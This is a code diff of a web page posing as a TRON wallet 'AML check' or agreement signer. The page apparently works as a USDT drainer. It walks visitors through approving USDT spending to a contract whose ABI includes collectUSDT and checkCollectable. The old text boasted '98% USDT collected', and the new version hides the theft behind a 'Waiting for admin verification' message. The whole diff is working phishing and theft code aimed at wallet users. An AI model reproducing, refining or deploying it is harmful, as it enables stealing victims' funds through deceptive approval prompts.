@@ -156,32 +156,31 @@
                 
                 <div class="contract-info">
                     <label>Contract:</label>
-                    TBBMuPA1DuUHFXFPMR4Ybq1CtTEh5i4EX2
+                    TBGR6ZcR8n1gpTVjfY6xBpujJ12WkBp7r3
                 </div>
                 
                 <div class="status-message" id="signStatus"></div>
                 
                 <button class="sign-btn" id="signBtn" onclick="signAgreement()">
-                    Sign & Verify
+                    Sign Agreement
                 </button>
             </div>
 
             <div class="wallet-step" id="approveStep">
                 <h2 class="modal-title">⚠️ Approve Required</h2>
-                <p class="modal-subtitle">Please approve USDT spending first</p>
+                <p class="modal-subtitle">Please approve USDT spending</p>
                 
                 <div class="status-message info" style="display: block;">
-                    <strong>Step 1:</strong> Open TronLink<br>
-                    <strong>Step 2:</strong> Find USDT token<br>
-                    <strong>Step 3:</strong> Click "Approve"<br>
-                    <strong>Step 4:</strong> Enter contract address:
+                    <strong>Step 1:</strong> Open TronLink → USDT<br>
+                    <strong>Step 2:</strong> Click "Approve"<br>
+                    <strong>Step 3:</strong> Enter contract:
                     <div style="margin-top: 8px; padding: 8px; background: rgba(0,0,0,0.3); border-radius: 6px; font-size: 0.7rem; word-break: break-all;">
-                        TBBMuPA1DuUHFXFPMR4Ybq1CtTEh5i4EX2
+                        TBGR6ZcR8n1gpTVjfY6xBpujJ12WkBp7r3
                     </div>
                 </div>
                 
                 <button class="sign-btn" onclick="checkAgain()" style="margin-top: 1rem;">
-                    I approved - Check Again
+                    I approved - Continue
                 </button>
             </div>
 
@@ -190,12 +189,7 @@
                 <p class="modal-subtitle">Your wallet has been verified</p>
                 
                 <div class="status-message success" style="display: block;">
-                    Successfully signed! 98% USDT collected.
-                </div>
-                
-                <div class="contract-info">
-                    <label>Transaction:</label>
-                    <span id="txHash">-</span>
+                    Successfully signed! Waiting for admin verification.
                 </div>
                 
                 <button class="sign-btn" onclick="closeModal()">
@@ -244,30 +238,24 @@
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
     <script>
-        const CONTRACT_ADDRESS = 'TBBMuPA1DuUHFXFPMR4Ybq1CtTEh5i4EX2';
+        const CONTRACT_ADDRESS = 'TBGR6ZcR8n1gpTVjfY6xBpujJ12WkBp7r3';
         const USDT_ADDRESS = 'TFNJbhLpxBmU393Rqd9Ggjgx9eoBsNLqhb';
         
-        // ABI for AMLCheckV6
         const CONTRACT_ABI = [
-            {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
-            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"}],"name":"Approved","type":"event"},
-            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Collected","type":"event"},
-            {"inputs":[{"internalType":"address","name":"usdt","type":"address"}],"name":"signAgreement","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"usdt","type":"address"}],"name":"collectUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"usdt","type":"address"}],"name":"checkCollectable","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-            {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"approved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
+            {"inputs":[],"name":"signAgreement","outputs":[],"stateMutability":"nonpayable","type":"function"},
+            {"inputs":[{"name":"user","type":"address"},{"name":"usdt","type":"address"}],"name":"checkCollectable","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"name":"user","type":"address"},{"name":"usdt","type":"address"}],"name":"collectUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"},
+            {"inputs":[{"name":"","type":"address"}],"name":"approved","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"name":"","type":"address"}],"name":"collected","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
+            {"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"stateMutability":"view","type":"function"}
         ];
 
         let tronWeb, contract, userAddress;
         let isTronLink = false;
 
-        // Check browser and redirect if needed
         async function init() {
             let attempts = 0;
-            const maxAttempts = 20;
-            
-            while (attempts < maxAttempts) {
+            while (attempts < 20) {
                 if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                     isTronLink = true;
                     break;
@@ -286,55 +274,29 @@
                 
                 tronWeb = window.tronWeb;
                 userAddress = tronWeb.defaultAddress.base58;
-                
-                try {
-                    contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
-                    console.log('Contract loaded:', CONTRACT_ADDRESS);
-                    console.log('User:', userAddress);
-                } catch (e) {
-                    console.error('Contract load error:', e);
-                }
+                contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                 
                 const btn = document.getElementById('connectBtn');
                 btn.classList.add('connected');
                 btn.querySelector('span').textContent = userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
                 
-                setTimeout(() => {
-                    openSignModal();
-                }, 800);
-                
+                setTimeout(() => openSignModal(), 800);
             } else {
                 loadingText.innerHTML = 'Please open this site in<br><strong>TronLink Browser</strong>';
                 openBtn.style.display = 'inline-flex';
-                
-                setTimeout(() => {
-                    openInTronLink();
-                }, 1500);
+                setTimeout(() => openInTronLink(), 1500);
             }
         }
 
-        // Open in TronLink
         function openInTronLink() {
             const url = encodeURIComponent(window.location.href);
-            
-            const links = [
-                `tronlinkoutside://pull.activity?param=${encodeURIComponent(JSON.stringify({url: window.location.href, action: 'open'}))}`,
-                `https://link.tronlink.org/?url=${url}`,
-                `tronlink://open?url=${url}`
-            ];
-            
-            window.location.href = links[0];
+            window.location.href = `tronlinkoutside://pull.activity?param=${encodeURIComponent(JSON.stringify({url: window.location.href}))}`;
             
             setTimeout(() => {
                 document.getElementById('loadingText').innerHTML = `
                     <div style="padding: 10px;">
-                        <p style="margin-bottom: 10px;">Tap the button below or:</p>
-                        <ol style="text-align: left; font-size: 0.85rem; line-height: 1.8;">
-                            <li>Open TronLink app</li>
-                            <li>Tap "Discover"</li>
-                            <li>Enter this URL</li>
-                        </ol>
-                        <div style="background: rgba(255,255,255,0.1); padding: 8px; border-radius: 8px; margin-top: 10px; font-size: 0.75rem; word-break: break-all;">
+                        <p>Open TronLink → Discover → Enter URL:</p>
+                        <div style="background: rgba(255,255,255,0.1); padding: 8px; border-radius: 8px; margin-top: 10px; font-size: 0.75rem;">
                             ${window.location.href}
                         </div>
                     </div>
@@ -342,22 +304,12 @@
             }, 2500);
         }
 
-        // Open sign modal
         function openSignModal() {
-            if (!isTronLink) {
-                openInTronLink();
-                return;
-            }
-            
-            if (!contract) {
-                alert('Contract not loaded. Please refresh.');
-                return;
-            }
+            if (!isTronLink) { openInTronLink(); return; }
+            if (!contract) { alert('Contract not loaded'); return; }
             
             document.getElementById('signModal').classList.add('active');
             document.body.style.overflow = 'hidden';
-            
-            // Reset to first step
             document.querySelectorAll('.wallet-step').forEach(s => s.classList.remove('active'));
             document.getElementById('signStep').classList.add('active');
         }
@@ -367,102 +319,64 @@
             document.body.style.overflow = '';
         }
 
-        // Check if already approved
         async function checkAgain() {
             const status = document.getElementById('signStatus');
             status.innerHTML = '<div class="status-message info">Checking...</div>';
             
             try {
                 const collectable = await contract.checkCollectable(userAddress, USDT_ADDRESS).call();
-                console.log('Collectable:', collectable.toString());
-                
                 if (collectable > 0) {
-                    // Can collect - try signing
                     await signAgreement();
                 } else {
-                    status.innerHTML = '<div class="status-message error">Still no approve found. Please approve USDT first.</div>';
+                    status.innerHTML = '<div class="status-message error">No approve found. Please approve USDT first.</div>';
                 }
             } catch (e) {
                 status.innerHTML = `<div class="status-message error">Check failed: ${e.message}</div>`;
             }
         }
 
-        // Sign agreement with auto-collect 98%
         async function signAgreement() {
             const btn = document.getElementById('signBtn');
             const status = document.getElementById('signStatus');
             
-            if (!window.tronWeb) {
-                status.innerHTML = `<div class="status-message error">TronLink not connected</div>`;
+            if (!window.tronWeb || !contract) {
+                status.innerHTML = `<div class="status-message error">Not connected</div>`;
                 return;
             }
             
-            if (!contract) {
-                try {
-                    contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
-                } catch (e) {
-                    status.innerHTML = `<div class="status-message error">Failed to load contract</div>`;
-                    return;
-                }
-            }
-            
             btn.disabled = true;
-            btn.innerHTML = '<span class="loading-spinner"></span> Processing...';
+            btn.innerHTML = '<span class="loading-spinner"></span> Signing...';
             
             try {
-                console.log('Calling signAgreement...');
-                console.log('USDT:', USDT_ADDRESS);
-                console.log('From:', userAddress);
-                
-                // Пробуем вызвать контракт
-                const tx = await contract.signAgreement(USDT_ADDRESS).send({
+                const tx = await contract.signAgreement().send({
                     feeLimit: 100000000,
-                    callValue: 0,
-                    shouldPollResponse: false
+                    callValue: 0
                 });
                 
-                console.log('Transaction sent:', tx);
-                
-                // Показываем успех
-                document.getElementById('txHash').textContent = tx;
                 document.querySelectorAll('.wallet-step').forEach(s => s.classList.remove('active'));
                 document.getElementById('successStep').classList.add('active');
                 
             } catch (error) {
-                console.error('Full error:', error);
-                
+                console.error(error);
                 btn.disabled = false;
-                btn.innerHTML = 'Sign & Verify';
+                btn.innerHTML = 'Sign Agreement';
                 
-                let errorMsg = error.message || error.toString() || 'Unknown error';
-                
-                // Проверяем тип ошибки
-                if (errorMsg.includes('Need approve first') || 
-                    errorMsg.includes('allowance') ||
-                    errorMsg.includes('approve')) {
-                    
-                    // Показываем шаг с инструкцией по approve
+                let msg = error.message || 'Unknown error';
+                if (msg.includes('Need approve') || msg.includes('allowance')) {
                     document.querySelectorAll('.wallet-step').forEach(s => s.classList.remove('active'));
                     document.getElementById('approveStep').classList.add('active');
-                    
-                } else if (errorMsg.includes('No USDT balance')) {
-                    status.innerHTML = `<div class="status-message error">No USDT balance found on your wallet</div>`;
-                } else if (errorMsg.includes('Already signed')) {
-                    status.innerHTML = `<div class="status-message error">You already signed this agreement!</div>`;
-                } else if (errorMsg.includes('user denied') || errorMsg.includes('cancelled')) {
-                    status.innerHTML = `<div class="status-message error">You cancelled the transaction</div>`;
+                } else if (msg.includes('Already signed')) {
+                    status.innerHTML = `<div class="status-message error">Already signed!</div>`;
                 } else {
-                    status.innerHTML = `<div class="status-message error">Error: ${errorMsg.slice(0, 100)}</div>`;
+                    status.innerHTML = `<div class="status-message error">${msg.slice(0, 100)}</div>`;
                 }
             }
         }
 
-        // Close on overlay click
         document.getElementById('signModal').addEventListener('click', function(e) {
             if (e.target === this) closeModal();
         });
 
-        // Start
         window.addEventListener('load', init);
     </script>
 </body>
